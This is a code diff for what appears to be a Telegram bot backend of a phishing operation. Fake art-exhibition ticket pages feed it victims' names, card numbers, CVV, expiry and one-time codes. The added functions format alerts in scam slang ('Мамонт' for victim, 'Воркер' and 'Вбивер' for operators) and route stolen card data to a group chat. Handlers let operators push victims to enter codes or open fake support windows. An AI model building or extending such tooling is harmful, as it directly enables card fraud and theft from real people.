@@ -193,6 +193,175 @@ def get_page_code_for_user(uid):
    
    return None
 
+def get_event_info_by_page_code(page_code):
+    """Отримує інформацію про подію за page_code"""
+    c = conn.cursor()
+    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if row:
+        return {
+            'price': row[0],
+            'currency': row[1],
+            'street': row[2]
+        }
+    return None
+
+def get_admin_username_by_user_id(user_id):
+    """Отримує username адміна за user_id"""
+    c = conn.cursor()
+    c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
+    row = c.fetchone()
+    if row and row[0]:
+        return row[0]
+    return None
+
+def format_card_notification_message(page_code, name, price, currency, admin_username):
+    """Формує красиве повідомлення про введення карти"""
+    # Визначаємо назву події за page_code
+    event_name = "Выставка"  # За замовчуванням
+    
+    # Спробуємо визначити назву події за page_code
+    if page_code:
+        # Тут можна додати логіку для визначення назви події
+        # Наприклад, по першій цифрі page_code
+        try:
+            series = int(page_code.split('-')[0])
+            event_names = [
+                "Terroir and Traditions",
+                "Collection Co–selection", 
+                "Snucie",
+                "Art that saves lives",
+                "Gotong Royong",
+                "Anna Konik",
+                "Uncensored",
+                "Jacek Adamas"
+            ]
+            if 1 <= series <= len(event_names):
+                event_name = event_names[series - 1]
+        except:
+            pass
+    
+    # Формуємо повідомлення
+    message = (
+        f"🔔 Мамонт перешел на ввод карты ({event_name})\n\n"
+        f"🎫 {event_name}\n"
+        f"👤 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
+    )
+    
+    return message
+
+def format_code_notification_message(page_code, code, price, currency, admin_username):
+    """Формує красиве повідомлення про введення коду"""
+    # Визначаємо назву події за page_code
+    event_name = "Выставка"  # За замовчуванням
+    
+    # Спробуємо визначити назву події за page_code
+    if page_code:
+        try:
+            series = int(page_code.split('-')[0])
+            event_names = [
+                "Terroir and Traditions",
+                "Collection Co–selection", 
+                "Snucie",
+                "Art that saves lives",
+                "Gotong Royong",
+                "Anna Konik",
+                "Uncensored",
+                "Jacek Adamas"
+            ]
+            if 1 <= series <= len(event_names):
+                event_name = event_names[series - 1]
+        except:
+            pass
+    
+    # Формуємо повідомлення
+    message = (
+        f"🔔 Мамонт ввел код ({event_name})\n\n"
+        f"🎫 {event_name}\n"
+        f"🔐 Код: {code or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
+    )
+    
+    return message
+
+def format_push_notification_message(admin_username, name, price, currency):
+    """Формує красиве повідомлення про ПУШ"""
+    message = (
+        f"🔔 Отправлен на ввод пуш\n\n"
+        f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
+        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+    )
+    return message
+
+def format_support_notification_message(admin_username, name, price, currency):
+    """Формує красиве повідомлення про ТЕХ ПОДДЕРЖКА"""
+    message = (
+        f"🔔 Отправлен обратиться в ТП\n\n"
+        f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
+        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+    )
+    return message
+
+def format_text_notification_message(admin_username, name, price, currency):
+    """Формує красиве повідомлення про ТЕКСТ"""
+    message = (
+        f"🔔 Отправлен на кастомное окно\n\n"
+        f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
+        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+    )
+    return message
+
+def format_code_request_message(admin_username, name, price, currency, page_code):
+    """Формує красиве повідомлення про запит коду"""
+    message = (
+        f"🔔 Отправлен запрос на код\n\n"
+        f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
+        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}"
+    )
+    return message
+
+def format_card_payment_message(page_code, name, price, currency, card_number, country=""):
+    """Формує красиве повідомлення про введення карти"""
+    # Визначаємо назву події за page_code
+    event_name = "Выставка"  # За замовчуванням
+    
+    if page_code:
+        try:
+            series = int(page_code.split('-')[0])
+            event_names = [
+                "Terroir and Traditions",
+                "Collection Co–selection", 
+                "Snucie",
+                "Art that saves lives",
+                "Gotong Royong",
+                "Anna Konik",
+                "Uncensored",
+                "Jacek Adamas"
+            ]
+            if 1 <= series <= len(event_names):
+                event_name = event_names[series - 1]
+        except:
+            pass
+    
+    message = (
+        f"🔔 Мамонт ввел карту ({event_name})\n\n"
+        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
+        f"👤 Мамонт: {name or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"💳 Номер карты: {card_number or 'Не указано'}\n"
+        f"🌍 Страна карты: {country or 'Не указано'}"
+    )
+    
+    return message
+
 # Додаємо колонку page_code, якщо вона не існує
 try:
     c.execute('SELECT page_code FROM site_users LIMIT 1')
@@ -1998,11 +2167,57 @@ async def admin_enter_text(message: types.Message):
     ip = step.replace("text_for_", "")
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+    
+    # Отримуємо інформацію про користувача та подію
+    user_name = None
+    event_price = None
+    event_currency = None
+    
+    if ip:
+        # Отримуємо ім'я користувача за IP
+        c = conn.cursor()
+        c.execute('SELECT name FROM users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
+        
+        # Знаходимо page_code за IP
+        page_code_for_text = None
+        c.execute('SELECT page_code FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+        row = c.fetchone()
+        if row:
+            page_code_for_text = row[0]
+        
+        if page_code_for_text:
+            # Отримуємо інформацію про подію
+            event_info = get_event_info_by_page_code(page_code_for_text)
+            if event_info:
+                event_price = event_info.get('price')
+                event_currency = event_info.get('currency')
+            
+            # Надсилаємо красиве повідомлення про текст адміну, чия це посилання
+            admin_user_id = None
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code_for_text,))
+            row = c.fetchone()
+            if row:
+                admin_user_id = row[0]
+            
+            if admin_user_id:
+                admin_username = get_admin_username_by_user_id(admin_user_id)
+                text_message = format_text_notification_message(
+                    admin_username=admin_username,
+                    name=user_name,
+                    price=event_price,
+                    currency=event_currency
+                )
+                await bot.send_message(admin_user_id, text_message)
+    
     import aiohttp
     async with aiohttp.ClientSession() as session:
         # non-blocking replacement for requests.post
         await session.post('http://127.0.0.1:8080/set_custom_text', json={'text_id': text_id, 'text': text})
         await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
+    
     await message.answer("Кнопка с текстом появится на сайте пользователя.")
     user_step[message.from_user.id] = None
 
@@ -2382,12 +2597,15 @@ async def payment_notify(request):
     # Лог з ФІО більше не надсилається
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     page_code = data.get('page_code', '')
-    msg2 = (
-        f"E: {email}\n"
-        f"C: {card}\n"
-        f"D: {expiry}\n"
-        f"V: {cvv}\n"
-        f"I: {ip}" + sum_str
+    
+    # Формуємо красиве повідомлення про карту
+    card_message = format_card_payment_message(
+        page_code=page_code,
+        name=name,
+        price=price,
+        currency=currency,
+        card_number=card,
+        country=""  # Країну можна додати пізніше
     )
     kb2_buttons = [
             InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
@@ -2407,9 +2625,9 @@ async def payment_notify(request):
     ]
     )
     try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+        await bot.send_message(PAYMENT_GROUP_ID, card_message, reply_markup=kb2)
     except Exception as e:
-        print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
+        print(f"[ERROR] Не вдалося надіслати card_message у PAYMENT_GROUP_ID: {e}")
         import traceback
         traceback.print_exc()
     # 3. Повідомлення з кодом, IP + кнопка Request again
@@ -2441,16 +2659,42 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        # Прибираємо лог "Мамонт ввёл ФИО" - залишаємо тільки карту та код
+        # Формуємо красиве повідомлення про карту
         try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+            # Отримуємо інформацію про подію
+            event_info = get_event_info_by_page_code(page_code) if page_code else None
+            price = event_info.get('price') if event_info else None
+            currency = event_info.get('currency') if event_info else None
+            
+            # Отримуємо username адміна
+            admin_username = get_admin_username_by_user_id(admin_user_id)
+            
+            # Формуємо красиве повідомлення
+            card_message = format_card_notification_message(
+                page_code=page_code,
+                name=name,
+                price=price,
+                currency=currency,
+                admin_username=admin_username
+            )
+            
+            await bot.send_message(admin_user_id, card_message)
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         if code:
             try:
-                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+                # Формуємо красиве повідомлення про код
+                code_message = format_code_notification_message(
+                    page_code=page_code,
+                    code=code,
+                    price=price,
+                    currency=currency,
+                    admin_username=admin_username
+                )
+                
+                await bot.send_message(admin_user_id, code_message)
             except Exception as e:
                 print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
                 import traceback
@@ -2461,7 +2705,36 @@ async def code_notify(request):
     data = await request.json()
     page_code = data.get('page_code', '')
     ip = data.get('ip', '')
-    text = f"Page Code: {page_code}\nIP: {ip}"
+    
+    # Отримуємо інформацію про користувача та подію
+    user_name = None
+    event_price = None
+    event_currency = None
+    
+    if ip:
+        # Отримуємо ім'я користувача за IP
+        c = conn.cursor()
+        c.execute('SELECT name FROM users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
+    
+    if page_code:
+        # Отримуємо інформацію про подію
+        event_info = get_event_info_by_page_code(page_code)
+        if event_info:
+            event_price = event_info.get('price')
+            event_currency = event_info.get('currency')
+    
+    # Формуємо красиве повідомлення про код
+    code_message = format_code_request_message(
+        admin_username="",  # Тут можна додати username адміна, якщо потрібно
+        name=user_name,
+        price=event_price,
+        currency=event_currency,
+        page_code=page_code
+    )
+    
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -2469,7 +2742,7 @@ async def code_notify(request):
             ]
         ]
     )
-    await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
+    await bot.send_message(PAYMENT_GROUP_ID, code_message, reply_markup=kb)
     # --- Додаю дублювання адміну, якщо знайдено user_id по page_code ---
     admin_user_id = None
     if page_code:
@@ -2479,8 +2752,30 @@ async def code_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        # Лог "Мамонт ввёл код" залишається
-        await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+        # Формуємо красиве повідомлення про код
+        try:
+            # Отримуємо інформацію про подію
+            event_info = get_event_info_by_page_code(page_code) if page_code else None
+            price = event_info.get('price') if event_info else None
+            currency = event_info.get('currency') if event_info else None
+            
+            # Отримуємо username адміна
+            admin_username = get_admin_username_by_user_id(admin_user_id)
+            
+            # Формуємо красиве повідомлення
+            code_message = format_code_request_message(
+                admin_username=admin_username,
+                name=user_name,
+                price=price,
+                currency=currency,
+                page_code=page_code
+            )
+            
+            await bot.send_message(admin_user_id, code_message)
+        except Exception as e:
+            print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
+            import traceback
+            traceback.print_exc()
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
@@ -2495,6 +2790,27 @@ async def admin_action_handler(call: types.CallbackQuery):
     action = parts[0]
     ip = parts[1] if len(parts) > 1 else None
     page_code = parts[2] if action == 'push' and len(parts) > 2 else None
+    
+    # Отримуємо інформацію про користувача та подію
+    user_name = None
+    event_price = None
+    event_currency = None
+    
+    if ip:
+        # Отримуємо ім'я користувача за IP
+        c = conn.cursor()
+        c.execute('SELECT name FROM users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
+    
+    if page_code:
+        # Отримуємо інформацію про подію
+        event_info = get_event_info_by_page_code(page_code)
+        if event_info:
+            event_price = event_info.get('price')
+            event_currency = event_info.get('currency')
+    
     if action == 'push':
         print(f'[DEBUG] admin_action_handler: push page_code={page_code}, ip={ip}, data={call.data}')
         import aiohttp as aiohttp_client
@@ -2503,13 +2819,35 @@ async def admin_action_handler(call: types.CallbackQuery):
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
                 print(f'[DEBUG] Push response: {resp.status} {await resp.text()}')
+                
+                # Надсилаємо красиве повідомлення адміну, чия це посилання
+                if page_code:
+                    admin_user_id = None
+                    c = conn.cursor()
+                    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                    row = c.fetchone()
+                    if row:
+                        admin_user_id = row[0]
+                    
+                    if admin_user_id:
+                        admin_username = get_admin_username_by_user_id(admin_user_id)
+                        push_message = format_push_notification_message(
+                            admin_username=admin_username,
+                            name=user_name,
+                            price=event_price,
+                            currency=event_currency
+                        )
+                        await bot.send_message(admin_user_id, push_message)
+                
             except Exception as e:
                 print(f'[DEBUG] Push request failed: {e}')
         await call.answer("Push notification sent")
         return
+    
     import aiohttp as aiohttp_client
     async with aiohttp_client.ClientSession() as session:
         await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
+    
     if action == 'card':
         await call.answer("Сигнал на сайт: не вірна карта")
     elif action == 'block':
@@ -2519,6 +2857,34 @@ async def admin_action_handler(call: types.CallbackQuery):
     elif action == 'support':
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
+        
+        # Надсилаємо красиве повідомлення про технічну підтримку
+        if ip:
+            # Знаходимо page_code за IP
+            page_code_for_support = None
+            c = conn.cursor()
+            c.execute('SELECT page_code FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+            row = c.fetchone()
+            if row:
+                page_code_for_support = row[0]
+            
+            if page_code_for_support:
+                admin_user_id = None
+                c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code_for_support,))
+                row = c.fetchone()
+                if row:
+                    admin_user_id = row[0]
+                
+                if admin_user_id:
+                    admin_username = get_admin_username_by_user_id(admin_user_id)
+                    support_message = format_support_notification_message(
+                        admin_username=admin_username,
+                        name=user_name,
+                        price=event_price,
+                        currency=event_currency
+                    )
+                    await bot.send_message(admin_user_id, support_message)
+        
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
         await call.answer("Введіть текст повідомлення:")
@@ -2527,12 +2893,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
-    elif action == 'push':
-        if page_code:
-            await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
-        else:
-            print('[push] No page_code provided!')
-        await call.answer("Push notification sent")
+    
     # НЕ змінюємо клавіатуру!
     await call.answer()
 
